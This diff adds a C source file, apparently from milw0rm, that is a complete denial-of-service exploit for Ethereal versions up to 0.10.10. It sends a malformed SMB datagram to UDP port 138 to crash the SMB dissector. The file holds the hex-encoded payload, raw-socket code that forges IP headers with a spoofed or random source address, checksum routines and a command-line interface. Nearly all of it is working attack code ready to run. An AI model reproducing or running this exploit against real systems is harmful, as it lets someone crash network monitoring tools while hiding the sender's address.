@@ -1,0 +1,261 @@
+/*****************************************************************/
+/*                                                               */
+/* Ethereal <= 0.10.10 dissect_ipc_state() DoS                   */
+/* Tested on 0.9.4 and 0.10.10                                   */
+/*                                                               */
+/* Bug found by the Ethereal BuildBot                            */
+/* Code ripped from vade79                                       */
+/* Exploit by Nicob <nicob@nicob.net>                            */
+/*                                                               */
+/* From the Ethereal Security Advisory #19 :                     */
+/* http://www.ethereal.com/appnotes/enpa-sa-00019.html           */
+/*                                                               */
+/* "The SMB dissector could cause a segmentation fault and throw */
+/* assertions. Versions affected: 0.9.0 to 0.10.10"              */
+/*                                                               */
+/*****************************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#ifdef _USE_ARPA
+#include <arpa/inet.h>
+#endif
+
+/* doesn't seem to be standardized, so... */
+#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
+#define BYTE_ORDER __BYTE_ORDER
+#endif
+#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
+#define BIG_ENDIAN __BIG_ENDIAN
+#endif
+#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
+#if BYTE_ORDER == BIG_ENDIAN
+#define _USE_BIG_ENDIAN
+#endif
+#endif
+
+/* will never need to be changed. */
+#define SMB_PORT 138
+
+/* avoid platform-specific header madness. */
+/* (just plucked out of header files) */
+struct iph{
+#ifdef _USE_BIG_ENDIAN
+unsigned char version:4,ihl:4;
+#else
+unsigned char ihl:4,version:4;
+#endif
+unsigned char tos;
+unsigned short tot_len;
+unsigned short id;
+unsigned short frag_off;
+unsigned char ttl;
+unsigned char protocol;
+unsigned short check;
+unsigned int saddr;
+unsigned int daddr;
+};
+struct udph{
+unsigned short source;
+unsigned short dest;
+unsigned short len;
+unsigned short check;
+};
+struct sumh{
+unsigned int saddr;
+unsigned int daddr;
+unsigned char fill;
+unsigned char protocol;
+unsigned short len;
+};
+
+/* malformed SMB data. (the bug) */
+static char payload[]=
+"\x11\x1a\x69\xb8\x0a\x02\x0f\x3d\x00\x8a\x00"
+"\xbb\x00\x00\x20\x46\x45\x45\x4a\x45\x43\x46\x46\x46\x43\x45\x50\x45\x4b\x43"
+"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x00\x20"
+"\x45\x44\x45\x43\x46\x45\x46\x46\x46\x44\x45\x42\x43\x41\x43\x41\x43\x41\x43"
+"\x41\x43\x41\x43\x41\x43\x49\x43\x41\x43\x41\x42\x4e\x00\xff\x53\x4d\x42\x25"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\xe8\x03\x00\x00\x36\x00\x00\x00\x00\x00\x21\x00\x56\x00\x03\x00\x01"
+"\x00\x00\x00\x02\x00\x32\x00\x5c\x4d\x41\x49\x4c\x53\x4c\x4f\x54\xb3\x42\x52"
+"\x4f\x57\x4e\x45\x00\x01\x00\x80\xfc\x0a\x00\x5f\x4e\x49\x43\x4f\x42\x5f\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x07\x90\x01\x00\x0f\x01\x55";
+
+/* prototypes. (and sig_alarm) */
+void nbt_nospoof(unsigned int);
+void nbt_spoof(unsigned int,unsigned int);
+unsigned short in_cksum(unsigned short *,signed int);
+unsigned int getip(char *);
+void printe(char *,signed char);
+void sig_alarm(){printe("alarm/timeout hit.",1);}
+
+/* begin. */
+int main(int argc,char **argv) {
+unsigned char nospoof=0;
+unsigned int daddr=0,saddr=0;
+printf("\n[*] Ethereal <= 0.10.10 SMB DoS.\n[*] by Nicob (code ripped from vade79)\n\n");
+if(argc<2){
+printf("[*] syntax: %s <dst host> [src host(0=random)]\n",
+argv[0]);
+printf("[*] syntax: %s <dst host> nospoof\n",argv[0]);
+exit(1);
+}
+if(!(daddr=getip(argv[1])))
+printe("invalid destination host/ip.",1);
+if(argc>2){
+if(strstr(argv[2],"nospoof"))nospoof=1;
+else saddr=getip(argv[2]);
+}
+printf("[*] destination\t: %s\n",argv[1]);
+if(!nospoof)
+printf("[*] source\t: %s (spoofed)\n",(saddr?argv[2]:"<random>"));
+else
+printf("[*] source\t: real IP\n");
+printf("[+] sending packet ...");
+fflush(stdout);
+srandom(time(0));
+if(nospoof)nbt_nospoof(daddr);
+else nbt_spoof(daddr,saddr);
+printf(".");
+fflush(stdout);
+printf("\n[*] done.\n\n");
+fflush(stdout);
+exit(0);
+}
+/* (non-spoofed) sends a (SMB) udp packet. */
+void nbt_nospoof(unsigned int daddr){
+signed int sock;
+struct sockaddr_in sa;
+sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
+sa.sin_family=AF_INET;
+sa.sin_port=htons(SMB_PORT);
+sa.sin_addr.s_addr=daddr;
+if(sendto(sock,payload,sizeof(payload)-1,0,(struct sockaddr *)&sa,
+sizeof(struct sockaddr))<sizeof(payload)-1)
+printe("failed to send non-spoofed SMB packet.",1);
+close(sock);
+return;
+}
+/* (spoofed) generates and sends a (SMB) udp packet. */
+void nbt_spoof(unsigned int daddr,unsigned int saddr){
+signed int sock=0,on=1;
+unsigned int psize=0;
+char *p,*s;
+struct sockaddr_in sa;
+struct iph ip;
+struct udph udp;
+struct sumh sum;
+/* create raw (UDP) socket. */
+if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_UDP))<0)
+printe("could not allocate raw socket.",1);
+/* allow (on some systems) for the user-supplied ip header. */
+#ifdef IP_HDRINCL
+if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
+printe("could not set IP_HDRINCL socket option.",1);
+#endif
+sa.sin_family=AF_INET;
+sa.sin_port=htons(SMB_PORT);
+sa.sin_addr.s_addr=daddr;
+psize=(sizeof(struct iph)+sizeof(struct udph)+sizeof(payload)-1);
+memset(&ip,0,sizeof(struct iph));
+memset(&udp,0,sizeof(struct udph));
+/* values not filled = 0, from the memset() above. */
+ip.ihl=5;
+ip.version=4;
+ip.tot_len=htons(psize);
+ip.saddr=(saddr?saddr:random()%0xffffffff);
+ip.daddr=daddr;
+ip.ttl=(64*(random()%2+1));
+ip.protocol=IPPROTO_UDP;
+ip.frag_off=64;
+udp.source=htons(SMB_PORT);
+udp.dest=htons(SMB_PORT);
+udp.len=htons(sizeof(struct udph)+sizeof(payload)-1);
+/* needed for (correct) checksums. */
+sum.saddr=ip.saddr;
+sum.daddr=ip.daddr;
+sum.fill=0;
+sum.protocol=ip.protocol;
+sum.len=htons(sizeof(struct udph)+sizeof(payload)-1);
+/* make sum/calc buffer for the udp checksum. (correct) */
+if(!(s=(char *)malloc(sizeof(struct sumh)+sizeof(struct udph)
++sizeof(payload)+1)))
+printe("malloc() failed.",1);
+memset(s,0,(sizeof(struct sumh)+sizeof(struct udph)
++sizeof(payload)+1));
+memcpy(s,&sum,sizeof(struct sumh));
+memcpy(s+sizeof(struct sumh),&udp,sizeof(struct udph));
+memcpy(s+sizeof(struct sumh)+sizeof(struct udph),
+payload,sizeof(payload)-1);
+udp.check=in_cksum((unsigned short *)s,
+sizeof(struct sumh)+sizeof(struct udph)+sizeof(payload)-1);
+free(s);
+/* make sum/calc buffer for the ip checksum. (correct) */
+if(!(s=(char *)malloc(sizeof(struct iph)+1)))
+printe("malloc() failed.",1);
+memset(s,0,(sizeof(struct iph)+1));
+memcpy(s,&ip,sizeof(struct iph));
+ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
+free(s);
+/* put the packet together. */
+if(!(p=(char *)malloc(psize+1)))
+printe("malloc() failed.",1);
+memset(p,0,psize);
+memcpy(p,&ip,sizeof(struct iph));
+memcpy(p+sizeof(struct iph),&udp,sizeof(struct udph));
+memcpy(p+(sizeof(struct iph)+sizeof(struct udph)),
+payload,sizeof(payload));
+/* send the malformed SMB packet. */
+if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
+sizeof(struct sockaddr))<psize)
+printe("failed to send forged SMB packet.",1);
+free(p);
+return;
+}
+/* standard method for creating TCP/IP checksums. */
+unsigned short in_cksum(unsigned short *addr,signed int len){
+unsigned short answer=0;
+register unsigned short *w=addr;
+register int nleft=len,sum=0;
+while(nleft>1){
+sum+=*w++;
+nleft-=2;
+}
+if(nleft==1){
+*(unsigned char *)(&answer)=*(unsigned char *)w;
+sum+=answer;
+}
+sum=(sum>>16)+(sum&0xffff);
+sum+=(sum>>16);
+answer=~sum;
+return(answer);
+}
+/* gets the ip from a host/ip/numeric. */
+unsigned int getip(char *host){
+struct hostent *t;
+unsigned int s=0;
+if((s=inet_addr(host))){
+if((t=gethostbyname(host)))
+memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
+}
+if(s==-1)s=0;
+return(s);
+}
+/* all-purpose error/exit function. */
+void printe(char *err,signed char e){
+printf("[!] %s\n",err);
+if(e)exit(e);
+return;
+}
+
+// milw0rm.com [2005-05-07]
